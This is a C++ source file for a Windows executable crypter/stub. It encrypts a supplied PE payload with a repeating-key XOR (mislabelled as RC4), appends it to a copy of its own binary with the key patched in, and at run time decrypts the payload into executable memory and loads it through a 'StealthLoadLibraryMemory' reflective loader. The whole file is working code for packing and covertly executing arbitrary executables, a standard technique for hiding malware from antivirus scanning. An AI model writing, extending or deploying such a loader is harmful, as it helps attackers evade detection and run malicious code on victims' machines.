/*  This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.
    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>. */

#include "Payload.h"

#include <Windows.h>
#include <stdio.h>
#include <StealthInject.h>
#include <fstream>
#include <math.h>
#include <io.h>
#include <iostream>
#include <fcntl.h>
#include <string>

void RC4(char* input, int length, char* output, char* key, int keyLength)
{
	for (int i = 0; i < length;)
	{
		for (int j = 0; j < keyLength && i < length; j++, i++)
			output[i] = input[i] ^ key[j];
	}
}

void GenerateKey()
{
	srand(GetTickCount());
	KeyData.Length = (rand() % (sizeof(KeyData.Data) - 32)) + 32; //Random length between 32 and the maximum key length

	int randomSamples[128];
	int samplePoints = (rand() + 32) % 128;
	for (int i = 0; i < samplePoints; i++)
	{
		srand(GetTickCount() + randomSamples[i]);

		POINT point;
		GetCursorPos(&point);
		randomSamples[i] = point.x + point.y + 1;
		Sleep(10 + rand() % 100);
		//printf("Sampled %i.\r\n", randomSamples[i]);
	}

	for (int i = 0; i < KeyData.Length; i++)
	{
		int seedValue = randomSamples[i % samplePoints];

		srand(GetTickCount() + seedValue);
		KeyData.Data[i] = (char)(rand() % seedValue);
	}
}

long getSizeOfInput(FILE *input)
{
	long retvalue = 0;
	fseek(input, 0L, SEEK_END);
	retvalue = ftell(input);
	fseek(input, 0L, SEEK_SET);
	return retvalue;
}

int FindImageEnd(IMAGE_DOS_HEADER* dosHeader)
{
	IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)((char*)dosHeader + dosHeader->e_lfanew);
	IMAGE_SECTION_HEADER* firstSection = (IMAGE_SECTION_HEADER*)(ntHeaders + 1);

	int lastAddress = 0;

	for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
	{
		int endAddress = firstSection[i].PointerToRawData + firstSection[i].SizeOfRawData;
		if (endAddress > lastAddress)
			lastAddress = endAddress;
	}

	return lastAddress;
}

IMAGE_SECTION_HEADER* FindSectionForVirtualAddress(IMAGE_SECTION_HEADER* firstSection, int sectionLength, void* virtualAddress)
{
	for (int i = 0; i < sectionLength; i++)
	{
		if ((unsigned long)virtualAddress >= firstSection[i].VirtualAddress && (unsigned long)virtualAddress < firstSection[i].VirtualAddress + firstSection[i].SizeOfRawData)
			return firstSection + i;
	}

	return NULL;
}

int RelativeVirtualAddressToOffset(IMAGE_SECTION_HEADER* firstSection, int sectionLength, void* virtualAddress)
{
	for (int i = 0; i < sectionLength; i++)
	{
		if ((unsigned long)virtualAddress >= firstSection[i].VirtualAddress && (unsigned long)virtualAddress < firstSection[i].VirtualAddress + firstSection[i].SizeOfRawData)
			return (int)(firstSection[i].PointerToRawData + (char*)virtualAddress - firstSection[i].VirtualAddress);
	}

	return -1;
}

unsigned char* ReadFile(const char* fileName, int* fileSize)
{
	HANDLE  file = CreateFile(fileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (file == INVALID_HANDLE_VALUE)
	{
		printf("Could not open file %s (error %d)\n", fileName, GetLastError());
		return NULL;
	}

	if ((*fileSize = GetFileSize(file, NULL)) < 0)
	{
		printf("Error getting filesize (error %d)\n", GetLastError());
		CloseHandle(file);
		return NULL;
	}

	unsigned char *buf;
	DWORD bytesread;
	buf = (unsigned char*)malloc(*fileSize);
	if (!ReadFile(file, buf, *fileSize, &bytesread, NULL))
	{
		printf("Error reading file (error %d)\n", GetLastError());
		CloseHandle(file);
		free(buf);
		return NULL;
	}

	if (*fileSize != bytesread)
	{
		printf("Internal read-error in system\n");
		CloseHandle(file);
		free(buf);
		return NULL;
	}

	CloseHandle(file);
	return buf;
}

void WriteFile(const char* fileName, char* data, int dataSize)
{
	std::ofstream outputFile = std::ofstream(fileName, std::fstream::trunc | std::fstream::binary);
	outputFile.write(data, dataSize);
	outputFile.close();
}

void ImportNewPayload(char* payload, int payloadSize)
{
	char* moduleBase = (char*)GetModuleHandle(NULL);
	IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)moduleBase;
	IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS32*)((char*)dosHeader + dosHeader->e_lfanew);
	IMAGE_SECTION_HEADER* sectionHeaders = (IMAGE_SECTION_HEADER*)(ntHeaders + 1);

	char* keyLengthVirtualAddress = (char*)((char*)&KeyData.Length - moduleBase);
	int keyLengthOffset = RelativeVirtualAddressToOffset(sectionHeaders, ntHeaders->FileHeader.NumberOfSections, keyLengthVirtualAddress);

	char* keyVirtualAddress = (char*)((char*)&KeyData.Data - moduleBase);
	int keyOffset = RelativeVirtualAddressToOffset(sectionHeaders, ntHeaders->FileHeader.NumberOfSections, keyVirtualAddress);

	char currentModuleFileName[MAX_PATH];
	GetModuleFileName(NULL, currentModuleFileName, sizeof(currentModuleFileName));

	if (((IMAGE_DOS_HEADER*)payload)->e_magic != IMAGE_DOS_SIGNATURE || ((IMAGE_NT_HEADERS*)(payload + ((IMAGE_DOS_HEADER*)payload)->e_lfanew))->Signature != IMAGE_NT_SIGNATURE)
	{
		printf("The payload does not contain a valid PE.\r\n");
		return;
	}

	//Generate the key
	GenerateKey();

	//Encrypt the payload
	RC4(payload, payloadSize, payload, (char*)KeyData.Data, KeyData.Length);

	//Write the payload to the file
	int fileSize;
	unsigned char* fileData = ReadFile(currentModuleFileName, &fileSize);
	int end = FindImageEnd((IMAGE_DOS_HEADER*)fileData);

	int appendixSize = fileSize - end;
	if (appendixSize < payloadSize + 4)
	{
		unsigned char* newFileData = new unsigned char[fileSize + payloadSize + 4 - appendixSize];
		memcpy(newFileData, fileData, fileSize);
		fileSize = fileSize + payloadSize + 4 - appendixSize;
		delete[] fileData;
		fileData = newFileData;
	}

	*(int*)(fileData + end) = payloadSize;
	memcpy(fileData + end + 4, payload, payloadSize);

	//Write the generated key to the file
	*(int*)(fileData + keyLengthOffset) = KeyData.Length;
	memcpy(fileData + keyOffset, KeyData.Data, KeyData.Length);

	fwrite(fileData, 1, fileSize, stdout);
	delete[] fileData;
}

void RunPayload()
{
	char fileName[MAX_PATH];
	GetModuleFileName(GetModuleHandle(NULL), fileName, sizeof(fileName));

	int fileSize;
	unsigned char* fileData = ReadFile(fileName, &fileSize);

	int end = FindImageEnd((IMAGE_DOS_HEADER*)fileData);
	if (fileSize == end)
	{
		printf("There is no payload!");
		return;
	}

	_PayloadData* payloadData = (_PayloadData*)(fileData + end);

	void* decryptedPayload = VirtualAlloc(NULL, payloadData->Length, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	RC4((char*)&payloadData->Data, payloadData->Length, (char*)decryptedPayload, (char*)KeyData.Data, KeyData.Length);
	delete[] fileData;

	//TODO could make another process as target
	printf("Loading encrypted module into current process.\n");
	HANDLE currentProcess = GetCurrentProcess();
	StealthLoadLibraryMemory(currentProcess, decryptedPayload);

	VirtualFree(decryptedPayload, 0, MEM_FREE);
}

BOOL FileExists(LPCTSTR szPath)
{
	DWORD dwAttrib = GetFileAttributes(szPath);

	return (dwAttrib != INVALID_FILE_ATTRIBUTES && !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}

int main(int argc, const char* argv[])
{
	if (argc > 1 && FileExists(argv[1]))
	{
		char path[MAX_PATH];
		GetModuleFileName(GetModuleHandle(NULL), path, sizeof(path));
		path[strlen(path) - 4] = '\0';
		strcat_s(path, ".loaded.exe");
		freopen(path, "w", stdout);
		_setmode(_fileno(stdout), _O_BINARY);

		int payloadSize;
		char* payload = (char*)ReadFile(argv[1], &payloadSize);
		ImportNewPayload(payload, payloadSize);
		delete[] payload;
	}
	else if (!_isatty(_fileno(stdin)))
	{
		_setmode(_fileno(stdout), _O_BINARY);
		_setmode(_fileno(stdin), _O_BINARY);

		//Get the size of the payload
		int payloadSize = getSizeOfInput(stdin);

		//Read the payload
		char* payload = new char[payloadSize];
		fread(payload, 1, payloadSize, stdin);

		ImportNewPayload(payload, payloadSize);
	}
	else
		RunPayload();
	return 0;
}
